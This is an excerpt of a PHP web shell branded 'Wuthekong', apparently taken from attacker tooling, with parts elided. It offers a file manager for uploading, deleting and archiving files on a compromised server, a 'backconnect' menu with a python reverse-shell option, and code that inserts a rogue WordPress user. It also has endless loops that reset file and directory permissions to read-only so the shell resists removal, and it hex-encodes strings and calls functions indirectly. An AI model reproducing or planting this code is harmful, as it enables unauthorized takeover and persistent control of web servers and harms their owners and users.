...
<head>
    ...
    <title>Wuthekong [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
...
<body>
    <div class="menu-header">
        <ul>
            ...
            <li><i class="fa-brands fa-github"></i>&nbsp;www.github.com/Wuthekong</li>
            <li class="logo-Wuthekong"><img width="400" height="400" src="//burung-puyuhwtk.pages.dev/mowk.png" align="right"></li>
            <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
                <li class="form-upload"><input type="submit" value="Upload" name="Wuthekong-up-submit" class="btn-submit">&nbsp;<input type="file" name="Wuthekong-upload" class="form-file"></li>
            </form>
        </ul>
    </div>
    <div class="menu-tools">
        <ul>
            ...
            <li><a href="//github.com/Wuthekong/" class="btn-submit"><i class="fa-solid fa-link"></i>&nbsp;README</a></li>
        </ul>
    </div>
    ...
    <div class="menu-file-manager">
            ...
            <form action="" method="post">
                <tbody>
                    ...
                    <?php foreach ($file_manager as $_D) : ?>
                        ...
                        <?php endif; ?>
                    <?php endforeach; ?>
                    <!-- Wuthekong Files Manager -->
                    <?php foreach ($file_manager as $_F) : ?>
                        <?php if ($fungsi[3]($_F)) : ?>
                            <tr>
                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<?= file_ext($_F) ?>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="Wuthekong-files"><?= namaPanjang($_F); ?></a></td>
        ...
        <br>
        <select name="Wuthekong-select" class="btn-submit">
    ...
    <?php if (isset($_GET['backconnect'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                ...
                <form action="" method="post">
                    <div class="modal-body">
                        <select class="bc-Wuthekong box-shadow" name="Wuthekong-bc">
...
if (isset($_POST['submitwp'])) {
    ...
    $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('$wp_user', '$wp_pass', 'Wuthekong', '', '', NOW(), '', 0, 'Wuthekong')";
...
if (isset($_POST['submit-bc'])) {
    ...
    } else if ($_POST['Wuthekong-bc'] == "python") {
...
while (True){
    ...
    if (Wuthekong_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
    }
    if (Wuthekong_perm("' . __DIR__ . '") != 0555){
        chmod("' . __DIR__ . '", 0555);
    }
}

function Wuthekong_perm($flename){
...
if (isset($_POST['Wuthekong-up-submit'])) {
    $namaFilenya = $_FILES['Wuthekong-upload']['name'];
    $tmpName = $_FILES['Wuthekong-upload']['tmp_name'];
...
if (isset($_POST['submit-action'])) {
    $items = $_POST['check'];
    if ($_POST['Wuthekong-select'] == "delete") {
        foreach ($items as $it) {
    ...
    } else if ($_POST['Wuthekong-select'] == 'unzip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
    ...
    } else if ($_POST['Wuthekong-select'] == 'zip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if ($fungsi[3]($fd)) {
...
while (True){
    ...
    if (Wuthekong_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
    } 
    if (Wuthekong_perm("' . $fungsi[0]() . '") != 0555){
        chmod("' . $fungsi[0]() . '", 0555);
    }
}
